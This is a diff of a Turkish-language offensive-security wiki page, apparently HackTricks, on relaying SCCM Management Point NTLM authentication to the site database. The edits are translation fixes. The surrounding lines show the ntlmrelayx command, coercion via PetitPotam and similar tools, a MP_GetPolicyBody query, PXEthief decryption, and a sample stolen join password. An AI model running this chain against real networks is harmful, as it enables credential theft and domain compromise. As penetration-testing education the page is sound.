@@ -7,7 +7,7 @@ Bir **System Center Configuration Manager (SCCM) Yönetim Noktası (MP)**'nı SM
 
 Yüksek seviyeli zincir:
 1. MP & site DB'yi keşfet ↦ kimlik doğrulaması yapılmamış HTTP uç noktası `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
-2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` komutunu başlat.
+2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` başlat.
 3. MP'yi **PetitPotam**, PrinterBug, DFSCoerce vb. kullanarak zorla.
 4. SOCKS proxy üzerinden `mssqlclient.py -windows-auth` ile aktarılan **<DOMAIN>\\<MP-host>$** hesabı olarak bağlan.
 5. Aşağıdakileri çalıştır:
@@ -27,7 +27,7 @@ MP ISAPI uzantısı **GetAuth.dll**, kimlik doğrulaması gerektirmeyen birkaç 
 |-----------|---------|
 | `MPKEYINFORMATIONMEDIA` | Site imzalama sertifikası genel anahtarını + *x86* / *x64* **Tüm Bilinmeyen Bilgisayarlar** cihazlarının GUID'lerini döndürür. |
 | `MPLIST` | Sitedeki her Yönetim Noktasını listeler. |
-| `SITESIGNCERT` | Birincil Site imzalama sertifikasını döndürür (LDAP olmadan site sunucusunu tanımlar). |
+| `SITESIGNCERT` | Birincil Site imzalama sertifikasını döndürür (site sunucusunu LDAP olmadan tanımlar). |
 
 Daha sonraki DB sorguları için **clientID** olarak kullanılacak GUID'leri alın:
 ```bash
@@ -81,7 +81,7 @@ Eğer zaten `PolicyID` ve `PolicyVersion`'a sahipseniz, clientID gereksinimini a
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> ÖNEMLİ: SSMS'de “Alınan Maksimum Karakter” değerini artırın (>65535) aksi takdirde blob kesilecektir.
+> ÖNEMLİ: SSMS'de "Maksimum Alınan Karakterler" değerini artırın (>65535) aksi takdirde blob kesilecektir.
 
 ---
 
@@ -93,7 +93,7 @@ echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
 # Decrypt with PXEthief (7 = decrypt attribute value)
 python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
 ```
-Recovered secrets example:
+Kurtarılan gizli bilgiler örneği:
 ```
 OSDJoinAccount : CONTOSO\\joiner
 OSDJoinPassword: SuperSecret2025!
@@ -150,7 +150,7 @@ abusing-ad-mssql.md
 
 
 ## Referanslar
-- [Yöneticiyle Konuşmak İsterim: Yönetim Noktası Relay'leri ile Gizli Bilgileri Çalmak](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [Yöneticiyle Konuşmak İsterim: Yönetim Noktası Relay'leri ile Sırları Çalmak](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
 - [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
 - [Yanlış Yapılandırma Yöneticisi – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
 {{#include ../../banners/hacktricks-training.md}}
